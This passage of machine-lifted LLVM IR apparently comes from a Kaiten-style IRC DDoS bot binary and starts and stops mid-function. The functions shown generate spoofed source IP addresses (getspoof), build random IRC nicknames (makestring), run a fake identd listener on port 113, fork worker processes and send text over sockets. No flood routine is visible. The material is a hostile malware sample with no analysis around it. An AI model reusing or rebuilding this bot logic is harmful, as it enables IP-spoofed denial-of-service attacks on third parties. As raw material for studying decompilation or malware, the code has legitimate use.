  br i1 %v1_80481fb, label %dec_label_pc_8048208, label %dec_label_pc_804820f

dec_label_pc_8048208:                             ; preds = %dec_label_pc_80481e8, %dec_label_pc_80481c7
  br label %dec_label_pc_804820f

dec_label_pc_804820f:                             ; preds = %dec_label_pc_80481de, %dec_label_pc_80481e8, %dec_label_pc_8048208
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8048208 ], [ 1, %dec_label_pc_80481e8 ], [ 1, %dec_label_pc_80481de ]
  br label %dec_label_pc_80482aa

dec_label_pc_804821a:                             ; preds = %dec_label_pc_80481a5
  %v2_804821d = load i8, i8* %tmp12, align 1
  %v4_8048220 = icmp eq i8 %v2_804821d, 0
  br i1 %v4_8048220, label %dec_label_pc_804824c, label %dec_label_pc_8048224

dec_label_pc_8048224:                             ; preds = %dec_label_pc_804821a
  %v1_8048227 = add i32 %arg2, 1
  %v1_804822b = add i32 %v4_8048193, 1
  store i32 %v1_804822b, i32* @edx, align 4
  %v4_8048230 = inttoptr i32 %v1_804822b to i8*
  %v5_8048233 = call i32 @strwildmatch(i8* %v4_8048230, i32 %v1_8048227)
  %v1_8048238 = icmp ne i32 %v5_8048233, 0
  %. = zext i1 %v1_8048238 to i32
  br label %dec_label_pc_804824c

dec_label_pc_804824c:                             ; preds = %dec_label_pc_8048224, %dec_label_pc_804821a
  %storemerge4 = phi i32 [ 1, %dec_label_pc_804821a ], [ %., %dec_label_pc_8048224 ]
  br label %dec_label_pc_80482aa

dec_label_pc_8048254:                             ; preds = %dec_label_pc_80481ab
  %v2_8048257 = load i8, i8* %arg1, align 1
  %v2_804825a = sext i8 %v2_8048257 to i32
  %v2_8048260 = call i32 @__GI_toupper(i32 %v2_804825a)
  store i32 %v2_8048260, i32* @ebx, align 4
  %v2_804826a = load i8, i8* %tmp12, align 1
  %v2_804826d = sext i8 %v2_804826a to i32
  %v2_8048273 = call i32 @__GI_toupper(i32 %v2_804826d)
  %v0_8048278 = load i32, i32* @ebx, align 4
  %v12_8048278 = icmp eq i32 %v0_8048278, %v2_8048273
  %v1_804827a = icmp eq i1 %v12_8048278, false
  br i1 %v1_804827a, label %dec_label_pc_80482a4, label %dec_label_pc_804827c

dec_label_pc_804827c:                             ; preds = %dec_label_pc_8048254
  %v1_804827f = add i32 %arg2, 1
  %v1_8048283 = add i32 %v4_8048193, 1
  store i32 %v1_8048283, i32* @edx, align 4
  %v4_8048288 = inttoptr i32 %v1_8048283 to i8*
  %v5_804828b = call i32 @strwildmatch(i8* %v4_8048288, i32 %v1_804827f)
  %v1_8048290 = icmp ne i32 %v5_804828b, 0
  %.6 = zext i1 %v1_8048290 to i32
  br label %dec_label_pc_80482a4

dec_label_pc_80482a4:                             ; preds = %dec_label_pc_804827c, %dec_label_pc_8048254
  %storemerge = phi i32 [ 1, %dec_label_pc_8048254 ], [ %.6, %dec_label_pc_804827c ]
  br label %dec_label_pc_80482aa

dec_label_pc_80482aa:                             ; preds = %dec_label_pc_804824c, %dec_label_pc_804820f, %dec_label_pc_80481b6, %dec_label_pc_80482a4
  %stack_var_-24.0 = phi i32 [ %storemerge5, %dec_label_pc_804820f ], [ %storemerge4, %dec_label_pc_804824c ], [ %v2_80481bc, %dec_label_pc_80481b6 ], [ %storemerge, %dec_label_pc_80482a4 ]
  %v2_80482b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80482b0, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048196, { 2, 0, 1 }
  uselistorder i32 (i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 4, 3, 0, 1, 2, 5 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80482aa, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804820f, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80482b6 = load i32, i32* @edi, align 4
  store i32 %v0_80482b6, i32* %stack_var_-8, align 4
  %v4_80482bd = ptrtoint i32* %stack_var_12 to i32
  %v5_80482d5 = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_8062e40.26 to i32), i32 %arg2, i32 %v4_80482bd)
  store i1 false, i1* @df, align 1
  store i32 ptrtoint (i8** @global_var_8062e40.26 to i32), i32* @edi, align 4
  %v3_80482ed = call i32 @_strlen(i8* bitcast (i8** @global_var_8062e40.26 to i8*))
  %v4_80482ed = mul i32 %v3_80482ed, -1
  %v5_80482ed = add i32 %v4_80482ed, -2
  store i32 %v5_80482ed, i32* @ecx, align 4
  %v1_80482f3 = sub i32 0, %v4_80482ed
  %v5_8048306 = call i32 @write(i32 %arg1, i32 ptrtoint (i8** @global_var_8062e40.26 to i32), i32 %v1_80482f3)
  %v0_804830b = load i32, i32* @esp, align 4
  %v1_804830b = add i32 %v0_804830b, 36
  %v5_804830b = icmp ugt i32 %v0_804830b, -37
  %v6_804830b = xor i32 %v0_804830b, -2147483648
  %v7_804830b = and i32 %v1_804830b, %v6_804830b
  %v8_804830b = icmp slt i32 %v7_804830b, 0
  store i1 %v5_804830b, i1* @cf, align 1
  store i1 %v8_804830b, i1* @of, align 1
  %v2_804830e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804830e, i32* @edi, align 4
  ret i32 %v5_8048306
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_8048317 = load i8, i8* @global_var_8062e24.27, align 4
  %v10_804831e = icmp eq i8 %v0_8048317, 1
  %v1_8048320 = icmp eq i1 %v10_804831e, false
  br i1 %v1_8048320, label %dec_label_pc_804834b, label %dec_label_pc_8048322

dec_label_pc_8048322:                             ; preds = %entry
  %v0_8048322 = load i32, i32* @global_var_80678c8.28, align 8
  %v3_804833a = call i32 @Send(i32 %v0_8048322, i32 ptrtoint ([30 x i8]* @global_var_805a6ef.29 to i32))
  br label %dec_label_pc_80483e9

dec_label_pc_804834b:                             ; preds = %entry
  %v1_804834b = call i32 @fork(i32 %tmp4)
  %v4_8048353 = icmp eq i32 %v1_804834b, 0
  %v1_8048357 = icmp eq i1 %v4_8048353, false
  br i1 %v1_8048357, label %dec_label_pc_8048364, label %dec_label_pc_8048359

dec_label_pc_8048359:                             ; preds = %dec_label_pc_804834b
  br label %dec_label_pc_80483e9

dec_label_pc_8048364:                             ; preds = %dec_label_pc_804834b
  %v0_8048364 = load i32, i32* @global_var_8062e30.30, align 16
  %v1_8048369 = add i32 %v0_8048364, 1
  store i32 %v1_8048369, i32* @global_var_8062e30.30, align 16
  %v2_8048374 = mul i32 %v1_8048369, 4
  %v1_8048377 = add i32 %v2_8048374, 4
  %v1_804837d = call i32 @malloc(i32 %v1_8048377)
  %v0_80483b011 = load i32, i32* @global_var_8062e30.30, align 16
  %v6_80483b913 = icmp eq i32 %v0_80483b011, 1
  br i1 %v6_80483b913, label %dec_label_pc_80483bb, label %dec_label_pc_804838e

dec_label_pc_804838e:                             ; preds = %dec_label_pc_8048364, %dec_label_pc_804838e
  %storemerge14 = phi i32 [ %v4_80483ad, %dec_label_pc_804838e ], [ 0, %dec_label_pc_8048364 ]
  %v2_8048391 = mul i32 %storemerge14, 4
  %v5_8048396 = add i32 %v2_8048391, %v1_804837d
  store i32 %v5_8048396, i32* @ecx, align 4
  %v0_80483a1 = load i32, i32* @global_var_80679ec.31, align 4
  %v2_80483a6 = add i32 %v0_80483a1, %v2_8048391
  %v1_80483a9 = inttoptr i32 %v2_80483a6 to i32*
  %v2_80483a9 = load i32, i32* %v1_80483a9, align 4
  %v2_80483ab = inttoptr i32 %v5_8048396 to i32*
  store i32 %v2_80483a9, i32* %v2_80483ab, align 4
  %v4_80483ad = add i32 %storemerge14, 1
  %v0_80483b0 = load i32, i32* @global_var_8062e30.30, align 16
  %v1_80483b5 = add i32 %v0_80483b0, -1
  %v6_80483b9 = icmp ugt i32 %v1_80483b5, %v4_80483ad
  br i1 %v6_80483b9, label %dec_label_pc_804838e, label %dec_label_pc_80483bb

dec_label_pc_80483bb:                             ; preds = %dec_label_pc_804838e, %dec_label_pc_8048364
  %v0_80483b0.lcssa = phi i32 [ %v0_80483b011, %dec_label_pc_8048364 ], [ %v0_80483b0, %dec_label_pc_804838e ]
  %v2_80483c0 = mul i32 %v0_80483b0.lcssa, 4
  %v5_80483c3 = add i32 %v2_80483c0, %v1_804837d
  %v1_80483c6 = add i32 %v5_80483c3, -4
  %v2_80483cc = inttoptr i32 %v1_80483c6 to i32*
  store i32 %v1_804834b, i32* %v2_80483cc, align 4
  %v0_80483ce = load i32, i32* @global_var_80679ec.31, align 4
  %v1_80483d6 = call i32 @free(i32 %v0_80483ce)
  store i32 %v1_804837d, i32* @global_var_80679ec.31, align 4
  br label %dec_label_pc_80483e9

dec_label_pc_80483e9:                             ; preds = %dec_label_pc_8048359, %dec_label_pc_8048322, %dec_label_pc_80483bb
  %stack_var_-24.0 = phi i32 [ %v1_804834b, %dec_label_pc_80483bb ], [ %v1_804834b, %dec_label_pc_8048359 ], [ 1, %dec_label_pc_8048322 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_80483ad, { 1, 0 }
  uselistorder i32 %v2_8048391, { 1, 0 }
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v0_80483b011, { 1, 0 }
  uselistorder i32 %v1_804837d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80483e9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804838e, { 1, 0 }
}

define i32 @getspoof() local_unnamed_addr {
entry:
  %v0_80483f4 = load i8*, i8** @global_var_8062e28.32, align 4
  %v1_80483f4 = ptrtoint i8* %v0_80483f4 to i32
  %v2_80483f9 = icmp eq i8* %v0_80483f4, null
  %v1_80483fb = icmp eq i1 %v2_80483f9, false
  br i1 %v1_80483fb, label %dec_label_pc_8048407, label %dec_label_pc_80483fd

dec_label_pc_80483fd:                             ; preds = %entry
  %v0_80483fd = call i32 @random()
  br label %dec_label_pc_8048450

dec_label_pc_8048407:                             ; preds = %entry
  %v0_8048407 = load i64, i64* @global_var_8062e2c.33, align 8
  %v1_8048407 = trunc i64 %v0_8048407 to i32
  %v9_804840c = icmp eq i32 %v1_8048407, 1
  %v1_804840f = icmp eq i1 %v9_804840c, false
  br i1 %v1_804840f, label %dec_label_pc_8048423, label %dec_label_pc_8048411

dec_label_pc_8048411:                             ; preds = %dec_label_pc_8048407
  %v2_8048419 = call i32 @ntohl(i32 %v1_80483f4)
  br label %dec_label_pc_8048450

dec_label_pc_8048423:                             ; preds = %dec_label_pc_8048407
  %v0_8048423 = call i32 @random()
  %v0_804842a = load i64, i64* @global_var_8062e2c.33, align 8
  %sext = mul i64 %v0_804842a, 4294967296
  %v5_804842f = sdiv i64 %sext, 4294967296
  %v6_8048439 = zext i32 %v0_8048423 to i64
  %v14_8048439 = urem i64 %v6_8048439, %v5_804842f
  %v15_8048439 = trunc i64 %v14_8048439 to i32
  %v0_804843c = load i8*, i8** @global_var_8062e28.32, align 4
  %v1_804843c = ptrtoint i8* %v0_804843c to i32
  %v2_8048441 = add i32 %v1_804843c, %v15_8048439
  %v1_8048444 = add i32 %v2_8048441, 1
  %v2_8048448 = call i32 @ntohl(i32 %v1_8048444)
  br label %dec_label_pc_8048450

dec_label_pc_8048450:                             ; preds = %dec_label_pc_8048411, %dec_label_pc_80483fd, %dec_label_pc_8048423
  %stack_var_-8.0 = phi i32 [ %v2_8048448, %dec_label_pc_8048423 ], [ %v2_8048419, %dec_label_pc_8048411 ], [ %v0_80483fd, %dec_label_pc_80483fd ]
  ret i32 %stack_var_-8.0

; uselistorder directives
  uselistorder i32 (i32)* @ntohl, { 1, 0 }
  uselistorder label %dec_label_pc_8048450, { 2, 0, 1 }
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %v4_804847d = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804847d

dec_label_pc_804845e:                             ; preds = %dec_label_pc_80484a0, %dec_label_pc_804847d
  %v3_804846f = call i32 @_strlen(i8* %arg1)
  %v6_8048476 = add i32 %v4_804847d, %v3_804846f
  %v1_8048479 = add i32 %v6_8048476, -1
  %v1_804847a = inttoptr i32 %v1_8048479 to i8*
  store i8 0, i8* %v1_804847a, align 1
  br label %dec_label_pc_804847d

dec_label_pc_804847d:                             ; preds = %entry, %dec_label_pc_804845e
  %v3_804848e = call i32 @_strlen(i8* %arg1)
  %v6_8048495 = add i32 %v4_804847d, %v3_804848e
  %v1_8048498 = add i32 %v6_8048495, -1
  %v1_8048499 = inttoptr i32 %v1_8048498 to i8*
  %v2_8048499 = load i8, i8* %v1_8048499, align 1
  %v10_804849c = icmp eq i8 %v2_8048499, 13
  br i1 %v10_804849c, label %dec_label_pc_804845e, label %dec_label_pc_80484a0

dec_label_pc_80484a0:                             ; preds = %dec_label_pc_804847d
  %v3_80484b1 = call i32 @_strlen(i8* %arg1)
  %v6_80484b8 = add i32 %v4_804847d, %v3_80484b1
  %v1_80484bb = add i32 %v6_80484b8, -1
  %v1_80484bc = inttoptr i32 %v1_80484bb to i8*
  %v2_80484bc = load i8, i8* %v1_80484bc, align 1
  %v11_80484bf = icmp eq i8 %v2_80484bc, 10
  br i1 %v11_80484bf, label %dec_label_pc_804845e, label %dec_label_pc_80484c3

dec_label_pc_80484c3:                             ; preds = %dec_label_pc_80484a0
  %v1_80484c8 = sext i8 %v2_80484bc to i32
  ret i32 %v1_80484c8

; uselistorder directives
  uselistorder i8 %v2_80484bc, { 1, 0 }
  uselistorder i32 %v4_804847d, { 1, 2, 0 }
  uselistorder i8* %arg1, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804847d, { 1, 0 }
}

define i32 @makestring() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-1060 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80484cc = load i32, i32* @edi, align 4
  %v0_80484cd = load i32, i32* @esi, align 4
  %v0_80484ce = load i32, i32* @ebx, align 4
  store i32 %v0_80484ce, i32* %stack_var_-16, align 4
  %v1_80484d5 = call i32 @random()
  store i32 %v1_80484d5, i32* @ecx, align 4
  %v2_80484f7 = sdiv i32 %v1_80484d5, 5
  store i32 %v2_80484f7, i32* @ebx, align 4
  %tmp33 = mul i32 %v2_80484f7, -5
  %v2_8048510 = add i32 %tmp33, %v1_80484d5
  store i32 %v2_8048510, i32* @esi, align 4
  %v1_804851e = add i32 %v2_8048510, 4
  %v1_8048527 = add i32 %v2_8048510, 5
  %v2_804852b = call i32 @malloc(i32 %v1_8048527)
  %tmp34 = bitcast i8** %stack_var_-36 to i32*
  store i32 %v2_804852b, i32* %tmp34, align 4
  %tmp35 = inttoptr i32 %v2_804852b to i8*
  store i32 %v2_804852b, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048541 = and i32 %v2_804852b, -256
  store i32 %v1_8048541, i32* @eax, align 4
  %v5_8048543 = call i8* @_memset(i8* %tmp35, i32 %v1_8048541, i32 %v1_8048527)
  %v6_8048543 = ptrtoint i8* %v5_8048543 to i32
  store i32 %v6_8048543, i32* @ecx, align 4
  %v3_8048554 = call i32 @__GI_fopen(i32 ptrtoint ([16 x i8]* @global_var_805a70f.35 to i32), i32 ptrtoint ([2 x i8]* @global_var_805a70d.34 to i32))
  %v4_804855c = icmp eq i32 %v3_8048554, 0
  %v1_8048560 = icmp eq i1 %v4_804855c, false
  br i1 %v1_8048560, label %dec_label_pc_80485dc, label %dec_label_pc_80485cf.preheader

dec_label_pc_80485cf.preheader:                   ; preds = %entry
  %v5_80485d553 = icmp sgt i32 %v1_804851e, 0
  br i1 %v5_80485d553, label %dec_label_pc_804856b, label %dec_label_pc_80486cf

dec_label_pc_804856b:                             ; preds = %dec_label_pc_804856b, %dec_label_pc_80485cf.preheader
  %v4_8048570 = phi i8* [ %tmp35, %dec_label_pc_80485cf.preheader ], [ %v3_80486cf.pre.pre, %dec_label_pc_804856b ]
  %storemerge54 = phi i32 [ 0, %dec_label_pc_80485cf.preheader ], [ %v4_80485cc, %dec_label_pc_804856b ]
  %v5_8048570 = ptrtoint i8* %v4_8048570 to i32
  %v6_8048570 = add i32 %v5_8048570, %storemerge54
  store i32 %v6_8048570, i32* @ebx, align 4
  %v0_8048573 = call i32 @random()
  store i32 %v0_8048573, i32* @ecx, align 4
  %v2_8048596 = sdiv i32 %v0_8048573, 26
  store i32 %v2_8048596, i32* @esi, align 4
  %tmp36 = mul i32 %v2_8048596, -26
  %v2_80485b9 = add i32 %tmp36, %v0_8048573
  %v14_80485b9 = trunc i32 %v2_80485b9 to i8
  %v2_80485c8 = add i8 %v14_80485b9, 65
  %v2_80485ca = load i32, i32* @ebx, align 4
  %v3_80485ca = inttoptr i32 %v2_80485ca to i8*
  store i8 %v2_80485c8, i8* %v3_80485ca, align 1
  %v4_80485cc = add nuw nsw i32 %storemerge54, 1
  %exitcond = icmp eq i32 %v4_80485cc, %v1_804851e
  %v3_80486cf.pre.pre = load i8*, i8** %stack_var_-36, align 4
  br i1 %exitcond, label %dec_label_pc_80486cf, label %dec_label_pc_804856b

dec_label_pc_80485dc:                             ; preds = %entry
  %v1_80485dc = call i32 @random()
  store i32 %v1_80485dc, i32* @ebx, align 4
  %v0_80485e3 = call i32 @random()
  %v0_80485e8 = load i32, i32* @ebx, align 4
  %v5_80485ea = mul i32 %v0_80485e8, %v0_80485e3
  store i32 %v5_80485ea, i32* @ecx, align 4
  %v2_804860e = sdiv i32 %v5_80485ea, 12039
  store i32 %v2_804860e, i32* @ebx, align 4
  %tmp57 = mul i32 %v2_804860e, -45402
  %v2_8048622 = add i32 %v5_80485ea, %tmp57
  store i32 %v2_8048622, i32* @esi, align 4
  %v1_8048630 = add i32 %v2_8048622, 1
  %v2_8048665 = ptrtoint i32* %stack_var_-1060 to i32
  %tmp37 = bitcast i32* %stack_var_-1060 to i8*
  %v5_804866039 = sub i32 -1, %v2_8048622
  %v13_804866041 = and i32 %v5_804866039, %v1_8048630
  %v14_804866042 = icmp slt i32 %v13_804866041, 0
  %v16_804866044 = icmp slt i32 %v5_804866039, 0
  %v2_804866345 = icmp eq i1 %v16_804866044, %v14_804866042
  br i1 %v2_804866345, label %dec_label_pc_8048665, label %dec_label_pc_804863d

dec_label_pc_804863d:                             ; preds = %dec_label_pc_80485dc, %dec_label_pc_804863d
  %storemerge1346 = phi i32 [ %v4_804865a, %dec_label_pc_804863d ], [ 0, %dec_label_pc_80485dc ]
  %v4_8048655 = call i32 @fgets(i32 %v2_8048665, i32 1024, i32 %v3_8048554)
  %v4_804865a = add i32 %storemerge1346, 1
  %v5_8048660 = sub i32 %v4_804865a, %v1_8048630
  %v11_8048660 = xor i32 %v4_804865a, %v1_8048630
  %v12_8048660 = xor i32 %v5_8048660, %v4_804865a
  %v13_8048660 = and i32 %v12_8048660, %v11_8048660
  %v14_8048660 = icmp slt i32 %v13_8048660, 0
  %v16_8048660 = icmp slt i32 %v5_8048660, 0
  %v2_8048663 = icmp eq i1 %v16_8048660, %v14_8048660
  br i1 %v2_8048663, label %dec_label_pc_8048665, label %dec_label_pc_804863d

dec_label_pc_8048665:                             ; preds = %dec_label_pc_804863d, %dec_label_pc_80485dc
  store i32 %v2_8048665, i32* @edx, align 4
  %v5_8048681 = call i32 @__GI_memset(i8* %tmp37, i32 0, i32 1024)
  %v4_804869e = call i32 @fgets(i32 %v2_8048665, i32 1024, i32 %v3_8048554)
  %v3_80486ac = call i32 @filter(i8* %tmp37)
  store i32 %v2_804852b, i32* @edi, align 4
  store i32 %v2_8048665, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_80486c2 = call i8* @_memcpy(i8* %tmp35, i8* %tmp37, i32 %v1_804851e)
  %v8_80486c2 = ptrtoint i8* %v7_80486c2 to i32
  store i32 %v8_80486c2, i32* @ecx, align 4
  %tmp38 = inttoptr i32 %v3_8048554 to i16*
  %v3_80486ca = call i32 @__GI_fclose(i16* %tmp38)
  br label %dec_label_pc_80486cf

dec_label_pc_80486cf:                             ; preds = %dec_label_pc_804856b, %dec_label_pc_80485cf.preheader, %dec_label_pc_8048665
  %v3_80486cf = phi i8* [ %tmp35, %dec_label_pc_8048665 ], [ %tmp35, %dec_label_pc_80485cf.preheader ], [ %v3_80486cf.pre.pre, %dec_label_pc_804856b ]
  %v4_80486cf = ptrtoint i8* %v3_80486cf to i32
  %v2_80486d8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80486d8, i32* @ebx, align 4
  store i32 %v0_80484cd, i32* @esi, align 4
  store i32 %v0_80484cc, i32* @edi, align 4
  ret i32 %v4_80486cf

; uselistorder directives
  uselistorder i32 %v5_8048660, { 1, 0 }
  uselistorder i32 %v4_804865a, { 3, 2, 1, 0 }
  uselistorder i32 %v5_804866039, { 1, 0 }
  uselistorder i8* %tmp37, { 2, 1, 0 }
  uselistorder i32 %v1_8048630, { 1, 2, 0 }
  uselistorder i32 %v2_8048622, { 2, 1, 0 }
  uselistorder i32 %v2_804860e, { 1, 0 }
  uselistorder i32 %v5_80485ea, { 1, 0, 2 }
  uselistorder i32 %v4_80485cc, { 1, 0 }
  uselistorder i32 %v2_8048596, { 1, 0 }
  uselistorder i32 %v0_8048573, { 1, 0, 2 }
  uselistorder i32 %v3_8048554, { 1, 2, 0, 3 }
  uselistorder i8* %tmp35, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_804851e, { 2, 0, 1 }
  uselistorder i32 %v2_8048510, { 2, 1, 0 }
  uselistorder i32 %v2_80484f7, { 1, 0 }
  uselistorder i32 %v1_80484d5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80486cf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804863d, { 1, 0 }
}

define i32 @identd() local_unnamed_addr {
entry:
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1228 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1260 = alloca i32, align 4
  store i32 2, i32* %stack_var_-1260, align 4
  %v4_80486fe = call i32 @socket(i32 2, i32 1, i32 0)
  %v13_8048706 = icmp eq i32 %v4_80486fe, -1
  br i1 %v13_8048706, label %dec_label_pc_804895c, label %dec_label_pc_8048710

dec_label_pc_8048710:                             ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 113, i32* %stack_var_-1260, align 4
  %v2_804871d = call i32 @htons(i16 113)
  %v2_8048730 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v4_80486fe, i32* %stack_var_-1260, align 4
  %v4_8048758 = call i32 @bind(i32 %v4_80486fe, i32 %v2_8048730, i32 16)
  %v10_804875d = icmp eq i32 %v4_8048758, -1
  br i1 %v10_804875d, label %dec_label_pc_804895c, label %dec_label_pc_8048766

dec_label_pc_8048766:                             ; preds = %dec_label_pc_8048710
  store i32 %v4_80486fe, i32* %stack_var_-1260, align 4
  %v3_8048774 = call i32 @listen(i32 %v4_80486fe, i32 1)
  %v10_8048779 = icmp eq i32 %v3_8048774, -1
  br i1 %v10_8048779, label %dec_label_pc_804895c, label %dec_label_pc_8048782

dec_label_pc_8048782:                             ; preds = %dec_label_pc_8048766
  %v0_8048782 = load i32, i32* %stack_var_-1260, align 4
  %v1_8048782 = call i32 @fork(i32 %v0_8048782)
  %v1_8048787 = icmp eq i32 %v1_8048782, 0
  br i1 %v1_8048787, label %dec_label_pc_804895c, label %dec_label_pc_804878f

dec_label_pc_804878f:                             ; preds = %dec_label_pc_8048782
  store i32 16, i32* %stack_var_-36, align 4
  %v2_8048796 = ptrtoint i32* %stack_var_-36 to i32
  %v2_8048799 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v4_80486fe, i32* %stack_var_-1260, align 4
  %v4_80487aa = call i32 @accept(i32 %v4_80486fe, i32 %v2_8048799, i32 %v2_8048796)
  %v4_80487b2 = add i32 %v4_80487aa, 1
  %v13_80487b2 = icmp eq i32 %v4_80487b2, 0
  %v1_80487b6 = icmp eq i1 %v13_80487b2, false
  br i1 %v1_80487b6, label %dec_label_pc_80487c4.preheader, label %dec_label_pc_80487b8

dec_label_pc_80487b8:                             ; preds = %dec_label_pc_804878f
  store i32 0, i32* %stack_var_-1260, align 4
  %v1_80487bf = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80487c4.preheader

dec_label_pc_80487c4.preheader:                   ; preds = %dec_label_pc_80487b8, %dec_label_pc_804878f
  %v2_80487ce = ptrtoint i32* %stack_var_-1228 to i32
  %tmp27 = bitcast i32* %stack_var_-1228 to i8*
  %v2_80487e2 = udiv i32 %v4_80487aa, 32
  %v1_80487e8 = urem i32 %v4_80487aa, 32
  %v9_80487eb = shl i32 1, %v1_80487e8
  %v2_804880d = ptrtoint i32* %stack_var_-1100 to i32
  %v2_8048857 = mul nuw nsw i32 %v2_80487e2, 4
  %v3_8048857 = add nsw i32 %v2_8048857, -1224
  br label %dec_label_pc_80487c4

dec_label_pc_80487c4:                             ; preds = %dec_label_pc_80487c4.preheader, %dec_label_pc_8048849
  store i32 %v2_80487ce, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80487d5 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v0_80487eb = load i32, i32* @ebp, align 4
  %v4_80487eb = add i32 %v3_8048857, %v0_80487eb
  %v5_80487eb = inttoptr i32 %v4_80487eb to i32*
  %v6_80487eb = load i32, i32* %v5_80487eb, align 4
  %v12_80487eb = or i32 %v6_80487eb, %v9_80487eb
  store i32 %v12_80487eb, i32* %v5_80487eb, align 4
  store i32 60, i32* %stack_var_-1100, align 4
  store i32 %v4_80487b2, i32* %stack_var_-1260, align 4
  %v6_8048834 = call i32 @__libc_select(i32 %v4_80487b2, i32 %v2_80487ce, i32 0, i32 0, i32 %v2_804880d)
  %v2_8048839 = icmp slt i32 %v6_8048834, 0
  %v1_804883b = icmp eq i1 %v2_8048839, false
  br i1 %v1_804883b, label %dec_label_pc_8048849, label %dec_label_pc_804883d

dec_label_pc_804883d:                             ; preds = %dec_label_pc_80487c4
  store i32 0, i32* %stack_var_-1260, align 4
  %v1_8048844 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048849

dec_label_pc_8048849:                             ; preds = %dec_label_pc_80487c4, %dec_label_pc_804883d
  %v0_8048857 = load i32, i32* @ebp, align 4
  %v4_8048857 = add i32 %v3_8048857, %v0_8048857
  %v5_8048857 = inttoptr i32 %v4_8048857 to i32*
  %v6_8048857 = load i32, i32* %v5_8048857, align 4
  %v10_8048857 = and i32 %v6_8048857, %v9_80487eb
  %v11_8048857 = icmp ne i32 %v10_8048857, 0
  %v4_8048862 = icmp eq i1 %v11_8048857, false
  %v1_8048864 = icmp eq i1 %v4_8048862, false
  br i1 %v1_8048864, label %dec_label_pc_804886b, label %dec_label_pc_80487c4

dec_label_pc_804886b:                             ; preds = %dec_label_pc_8048849
  %v2_804887b = ptrtoint i32* %stack_var_-1092 to i32
  store i32 %v4_80487aa, i32* %stack_var_-1260, align 4
  %v5_804888b = call i32 @recv(i32 %v4_80487aa, i32 %v2_804887b, i32 1024, i32 0)
  %tmp28 = icmp slt i32 %v5_804888b, 1
  br i1 %tmp28, label %dec_label_pc_804889f, label %dec_label_pc_8048899

dec_label_pc_8048899:                             ; preds = %dec_label_pc_804886b
  %v7_804889d = icmp sgt i32 %v5_804888b, 19
  br i1 %v7_804889d, label %dec_label_pc_804889f, label %dec_label_pc_80488ab

dec_label_pc_804889f:                             ; preds = %dec_label_pc_8048899, %dec_label_pc_804886b
  store i32 0, i32* %stack_var_-1260, align 4
  %v1_80488a6 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80488ab

dec_label_pc_80488ab:                             ; preds = %dec_label_pc_8048899, %dec_label_pc_804889f
  %v0_80488ae = load i32, i32* @ebp, align 4
  %v2_80488ae = add i32 %v5_804888b, -1088
  %v3_80488ae = add i32 %v2_80488ae, %v0_80488ae
  %v4_80488ae = inttoptr i32 %v3_80488ae to i8*
  store i8 0, i8* %v4_80488ae, align 1
  %v0_80488ba = load i32, i32* @ebp, align 4
  %v2_80488ba = add i32 %v5_804888b, -1089
  %v3_80488ba = add i32 %v2_80488ba, %v0_80488ba
  %v4_80488ba = inttoptr i32 %v3_80488ba to i8*
  %v5_80488ba = load i8, i8* %v4_80488ba, align 1
  %v10_80488c2 = icmp eq i8 %v5_80488ba, 10
  br i1 %v10_80488c2, label %dec_label_pc_80488d6, label %dec_label_pc_80488c6

dec_label_pc_80488c6:                             ; preds = %dec_label_pc_80488ab
  %v5_80488ca = load i8, i8* %v4_80488ba, align 1
  %v10_80488d2 = icmp eq i8 %v5_80488ca, 13
  %v1_80488d4 = icmp eq i1 %v10_80488d2, false
  br i1 %v1_80488d4, label %dec_label_pc_80488e2, label %dec_label_pc_80488d6

dec_label_pc_80488d6:                             ; preds = %dec_label_pc_80488c6, %dec_label_pc_80488ab
  store i8 0, i8* %v4_80488ba, align 1
  %v0_80488e8.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80488e2

dec_label_pc_80488e2:                             ; preds = %dec_label_pc_80488c6, %dec_label_pc_80488d6
  %v0_804890c = phi i32 [ %v0_80488ba, %dec_label_pc_80488c6 ], [ %v0_80488e8.pre, %dec_label_pc_80488d6 ]
  %v2_80488e8 = add i32 %v5_804888b, -1090
  %v3_80488e8 = add i32 %v2_80488e8, %v0_804890c
  %v4_80488e8 = inttoptr i32 %v3_80488e8 to i8*
